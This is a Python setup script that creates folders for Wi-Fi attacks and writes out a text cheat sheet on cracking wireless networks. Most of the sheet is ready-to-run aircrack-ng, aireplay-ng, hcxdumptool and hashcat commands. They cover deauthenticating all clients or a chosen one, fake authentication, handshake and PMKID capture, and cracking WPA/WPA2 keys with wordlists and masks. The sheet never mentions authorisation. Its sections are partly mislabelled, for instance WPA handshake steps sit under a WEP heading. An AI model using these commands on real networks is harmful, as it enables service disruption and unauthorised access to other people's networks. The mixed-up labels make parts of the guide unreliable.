
# CREATES INDIVIDUAL CATEGORIZED FOLDERS FOR ANY RECONNAISSANCE

# Note: If ran in sudo Permissions will default to "Locked" 


import os

main = 'AP'
sub_one = 'SharkCaps'
sub_two = 'WordLi'
sub_tree = 'Hashcat'
sub_four = 'Xtras'
# sub_five = 'Xtras_2'

os.mkdir(main, mode=0o777)
# "0o777" is Defauly Mode to unlock all permissions ...
os.mkdir(sub_one, mode=0o777)
os.mkdir(sub_two, mode=0o777)
os.mkdir(sub_tree, mode=0o777)
os.mkdir(sub_four, mode=0o777)
# os.mkdir(sub_five, mode=0o777)

# [ "os.chmod" can change the permissions of anyy Directory or File created by "os", or any other arugment you use such as "open/write" ]


file = open("Txt", "w") 
file.write("Text Input")
file.close()

file = open("Man", "w") 
file.write("""

Tools:

airmon-ng
airodump-ng
aireplay-ng
aircrack-ng
Monitoring, Recon and Dumping

Using the aircrack-ng suite, Turn on the monitor mode

                                sudo airmon-ng start wlan0

Simple passive listening and capture, Used to discover AP in the environment

                                sudo airodump-ng wlan0mon

Targeted listening and capture, Focus on one AP and one channel

                   airodump-ng wlan0mon -c 11 --bssid E8:2C:6D.... -w sonic

Attacking WEP

WEP is an old encryption protocol but still used in some places, It is vulnerable to direct cracking attacks

Here, you want to get the 4-way WPA Handshake, It requires network traffic between the AP and one device

The process can be enhanced by sending deauth packets – – You can Deauth Packets to every device on the Network with “-a” … or you can target a specific device on the Network by adding “-c”

Aireplay Command used to send Deauth Packets “0” (See sources for more reference)
Deauth connected devices while airodump is running in a separate Terminal to initiate authentication process and try to get the handshake

In the airodump-ng Terminal, the WPA handshake will appear once captured

                       aireplay-ng -0 15 -a 1C:9E:CC:... -c 3C:2E:FF:... wlan0mon

- 0 means deauthentitcation - - 15 is number of deauths sent

- a mac address of access point

- c mac address of the client (station #) (This is optional, you can choose to not add this and knock all devices off network)
- wlan0mon is the interface name
# Another possibility is to use fake authentication to generate IV

# -1 = fake authentication

# 0 = delay between association demands

# -e = AP ESSID (name)

# -a = AP MAC

# -h = attacker MAC

                    aireplay-ng -1 0 -e teddy -a 00:14:7K:7E:40:80 -h 00:0F:9K:88:9K:82 wlan0mon

# ARP Sniffing and injection is another method

Aircrack-ng too directly crack the WEP Key

Cracking can be done using aircrack-ng

Note: Use a good Wordlist !

       aircrack-ng -a2 -b 28:33:88:0A:3A:CB -w '/home/lock/28:33:88:0A:6A:CB/why_.txt' '/home/lock/beyond-01.cap'

- a [a.mode]: force attack mode (1/WEP, 2/WPA-PSK)
- b [bssid]: target selection: access point's MAC
- w [words]: path to wordlist(s) filename(s)
- Drag and drop the .cap file

Other tools like hashcat can be used for cracking a Network, The outfile needs to be an HCCAPX file [Hashcat utils provide a binary to convert]

Attacking WPA2 PSK w/ HASHCAT (The old way)

                                        aircrack-ng outfile -w wordlist

# But also using other tools like hashcat

# The outfile needs to be an HCCAPX file

# Hashcat utils provide a binary to convert

./cap2hccapx.exe WPA2_test.cap-01.cap WPA2_test.hccapx

# Then you can crack it like a normal hash (see hashcat section)

./hashcat64.exe -m 2500 WPA2_test.hccapx wordlist.txt –force -O

Attacking WPA2 using PMKID

# You don’t need any network traffic

# Using hcxtools and hcxdumptool

# Monitor mode

sudo airmon-ng start wlan0mon

# PMKID capture

# It can take a while to capture PKMID (several minutes++)

# If an AP recieves our association request packet and supports sending 

sudo hcxdumptool -i wlan0mon -o outfile.pcapng –enable_status=1

# Then convert the captured data to a suitable format for hashcat

# -E retrieve possible passwords from WiFi-traffic (additional, this list will include ESSIDs)

# -I retrieve identities from WiFi-traffic

# -U retrieve usernames from WiFi-traffic

sudo hcxpcaptool -E essidlist -I identitylist -U usernamelist -z test.16800 test.pcapng

# Then, you can use hashcat to crack it (see hashcat section)

./hashcat -m 16800 test.16800 -a 3 -w 3 ‘?l?l?l?l?l?lt!’

Sources:

https://www.aircrack-ng.org/doku.php?id=cracking_wpa

https://www.aircrack-ng.org/doku.php?id=newbie_guide

https://www.aircrack-ng.org/doku.php?id=compatibility_drivers

https://www.aircrack-ng.org/doku.php?id=wpa_capture

https://shehackske.medium.com/capturing-and-cracking-wpa-handshake-using-aircrack-ng-d9496f30c7c3

https://cryptokait.com/2020/09/02/taking-password-cracking-to-the-next-level/
Update:

After running, airmon-ng check kill to activate adapter to find AP’s

run, service NetworkManager restart – To turn back on Network wifi
    """) 
file.close()
